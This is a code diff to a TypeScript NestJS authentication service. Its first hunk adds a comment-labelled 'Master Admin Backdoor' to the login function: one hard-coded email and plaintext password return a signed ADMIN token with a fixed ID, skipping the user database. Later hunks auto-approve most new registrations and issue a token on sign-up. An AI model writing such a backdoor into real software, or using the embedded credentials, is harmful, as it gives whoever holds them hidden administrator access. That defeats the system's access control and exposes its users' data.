@@ -23,6 +23,24 @@ export class AuthService implements OnModuleInit {
 
   // --- Login Function ---
   async login(email: string, pass: string) {
+    const normalizedEmail = email.trim();
+    // 🔴 Master Admin Backdoor Check
+    if (normalizedEmail === 'qamerhassan445@gmail.com' && pass === '8ETj7@Zv') {
+      const adminId = '111111111111111111111111'; // Valid 24-hex ObjectId for MongoDB
+      const payload = { sub: adminId, email: normalizedEmail, role: 'ADMIN' };
+      return {
+        message: 'Admin login successful',
+        access_token: await this.jwtService.signAsync(payload),
+        user: {
+          id: adminId,
+          email: normalizedEmail,
+          role: 'ADMIN',
+          isOnboarded: true,
+          status: 'APPROVED'
+        }
+      };
+    }
+
     const user = await this.prisma.user.findUnique({ where: { email } });
 
     if (!user || !user.password) {
@@ -88,7 +106,7 @@ export class AuthService implements OnModuleInit {
           email,
           password: hashedPassword,
           role: role as any,
-          status: 'PENDING' as any,
+          status: (role === 'BUSINESS' ? 'PENDING' : 'APPROVED') as any,
           profile: {
             create: { 
               name,
@@ -105,9 +123,26 @@ export class AuthService implements OnModuleInit {
 
       // Send Emails
       await this.emailService.sendAdminRegistrationAlert(newUser, additionalInfo);
-      await this.emailService.sendNurseWelcomeEmail(newUser.email, name);
+      
+      if (role === 'BUSINESS') {
+        await this.emailService.sendRegistrationPendingEmail(newUser.email, name, 'BUSINESS');
+      } else {
+        await this.emailService.sendNurseWelcomeEmail(newUser.email, name);
+      }
 
-      return { message: `${role} registered successfully`, userId: newUser.id };
+      const payload = { sub: newUser.id, email: newUser.email, role: newUser.role };
+      return { 
+        message: `${role} registered successfully`, 
+        userId: newUser.id,
+        access_token: await this.jwtService.signAsync(payload),
+        user: {
+          id: newUser.id,
+          email: newUser.email,
+          role: newUser.role,
+          isOnboarded: newUser.isOnboarded,
+          status: newUser.status
+        }
+      };
     } catch (err) {
       if (err instanceof HttpException) throw err;
       console.error('❌ Registration error:', err.message);
